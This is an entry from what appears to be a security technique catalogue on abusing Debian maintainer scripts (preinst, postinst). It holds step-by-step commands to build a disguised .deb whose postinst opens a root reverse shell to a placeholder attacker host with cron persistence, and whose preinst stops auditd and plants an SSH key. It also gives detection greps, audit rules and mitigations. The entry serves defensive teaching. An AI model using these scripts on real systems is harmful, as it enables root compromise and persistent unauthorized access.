---
name: "APT/DPKG Maintainer Script Execution"
packageManager: "apt"
slug: "apt-preinst-postinst-scripts"
category: "Code Execution"
severity: "critical"
platform:
  - "Linux"
description: "Debian packages support maintainer scripts (preinst, postinst, prerm, postrm) that are automatically executed with root privileges during package installation, upgrade, or removal. An attacker who can craft or modify a .deb package can embed arbitrary shell commands in these scripts, achieving immediate root-level code execution the moment a victim installs the package via dpkg or apt. This is one of the most direct code execution vectors in the Debian packaging ecosystem because the scripts run non-interactively and with no sandboxing or confinement by default."
prerequisites:
  - "Ability to deliver a crafted .deb package to the target (via malicious repository, social engineering, or local access)"
  - "The victim must install the package using dpkg -i or apt install, which requires root or sudo privileges"
  - "Basic knowledge of Debian package structure and dpkg-deb tooling"
attackScenarios:
  - title: "Malicious .deb Package with Reverse Shell postinst"
    description: "An attacker creates a minimal Debian package containing a postinst script that establishes a reverse shell back to attacker-controlled infrastructure. When a victim installs this package, the postinst script executes as root immediately after the package files are unpacked, granting the attacker a root shell on the target system."
    commands:
      - label: "Create the package directory structure"
        code: |
          mkdir -p /tmp/evil-pkg/DEBIAN
          mkdir -p /tmp/evil-pkg/usr/bin
        language: "bash"
      - label: "Create the DEBIAN/control file"
        code: |
          cat > /tmp/evil-pkg/DEBIAN/control << 'CTRL'
          Package: legitimate-looking-tool
          Version: 1.0.0
          Section: utils
          Priority: optional
          Architecture: amd64
          Maintainer: attacker@example.com
          Description: A seemingly legitimate utility package
          CTRL
        language: "bash"
      - label: "Create the malicious postinst script"
        code: |
          cat > /tmp/evil-pkg/DEBIAN/postinst << 'EOF'
          #!/bin/bash
          # This runs as root during package installation
          bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &
          # Optionally persist via cron
          echo "* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > /etc/cron.d/updater
          exit 0
          EOF
          chmod 755 /tmp/evil-pkg/DEBIAN/postinst
        language: "bash"
      - label: "Build the .deb package"
        code: |
          dpkg-deb --build /tmp/evil-pkg /tmp/legitimate-looking-tool_1.0.0_amd64.deb
        language: "bash"
      - label: "Victim installs the package (triggers postinst)"
        code: |
          sudo dpkg -i /tmp/legitimate-looking-tool_1.0.0_amd64.deb
        language: "bash"
  - title: "Backdoor via preinst Script with Stealth"
    description: "An attacker uses the preinst script to execute code before the package is even unpacked. This can be used to disable security tooling, modify system configurations, or install backdoors that persist even if the package installation fails or is rolled back."
    commands:
      - label: "Create a preinst that disables auditd before install"
        code: |
          cat > /tmp/evil-pkg/DEBIAN/preinst << 'EOF'
          #!/bin/bash
          # Disable audit logging before dropping payload
          systemctl stop auditd 2>/dev/null
          # Add attacker SSH key for persistence
          mkdir -p /root/.ssh
          echo "ssh-rsa AAAA...attacker-key..." >> /root/.ssh/authorized_keys
          exit 0
          EOF
          chmod 755 /tmp/evil-pkg/DEBIAN/preinst
        language: "bash"
detection:
  - title: "Inspect maintainer scripts of installed packages"
    description: "All maintainer scripts for installed packages are stored in /var/lib/dpkg/info/. Defenders should regularly audit these scripts for suspicious commands such as reverse shells, curl/wget downloads, cron modifications, or SSH key additions."
    commands:
      - code: |
          # List all postinst scripts and search for suspicious patterns
          grep -rl 'bash -i' /var/lib/dpkg/info/*.postinst 2>/dev/null
          grep -rl '/dev/tcp\|nc -e\|ncat\|socat\|curl.*|.*sh\|wget.*|.*sh' /var/lib/dpkg/info/*.{preinst,postinst,prerm,postrm} 2>/dev/null
        language: "bash"
  - title: "Monitor dpkg process execution in real-time"
    description: "Use auditd or process monitoring to detect child processes spawned by dpkg during package installation. Legitimate postinst scripts typically run package-specific configuration tools, not network utilities or shell redirections."
    commands:
      - code: |
          # Audit rule to monitor processes spawned by dpkg
          auditctl -a always,exit -F arch=b64 -S execve -F exe=/usr/bin/dpkg -k dpkg_exec
          # Also monitor executions from dpkg maintainer script directory
          auditctl -a always,exit -F arch=b64 -S execve -F dir=/var/lib/dpkg/info -k dpkg_script_exec
          # Search audit logs for suspicious dpkg child processes
          ausearch -k dpkg_exec -k dpkg_script_exec | grep -E 'bash|curl|wget|nc|python'
        language: "bash"
  - title: "Inspect a .deb before installing"
    description: "Before installing any third-party .deb file, extract and review its maintainer scripts to identify potentially malicious behavior."
    commands:
      - code: |
          # Extract and review maintainer scripts without installing
          dpkg-deb --ctrl-tarfile suspect-package.deb | tar -xO ./postinst 2>/dev/null
          dpkg-deb --ctrl-tarfile suspect-package.deb | tar -xO ./preinst 2>/dev/null
          # Or extract the full control archive
          dpkg-deb -e suspect-package.deb /tmp/inspect-control/
          cat /tmp/inspect-control/postinst
        language: "bash"
mitigation:
  - "Audit all .deb packages before installation by extracting and reviewing maintainer scripts with dpkg-deb -e"
  - "Only install packages from trusted, signed repositories with verified GPG keys"
  - "Use sandboxed environments or containers to test unfamiliar packages before deploying to production"
  - "Implement mandatory access control (AppArmor, SELinux) to confine dpkg and apt processes"
  - "Deploy file integrity monitoring (AIDE, OSSEC) on /var/lib/dpkg/info/ to detect unexpected script modifications"
  - "Use dpkg --dry-run or apt-get -s (simulate) to preview package actions before actual installation"
references:
  - title: "Debian Policy Manual - Maintainer Scripts"
    url: "https://www.debian.org/doc/debian-policy/ch-maintainerscripts.html"
  - title: "dpkg-deb(1) Manual Page"
    url: "https://man7.org/linux/man-pages/man1/dpkg-deb.1.html"
  - title: "Debian Wiki - Packaging Tutorial"
    url: "https://wiki.debian.org/Packaging/Intro"
created: 2026-04-02
updated: 2026-04-02
---
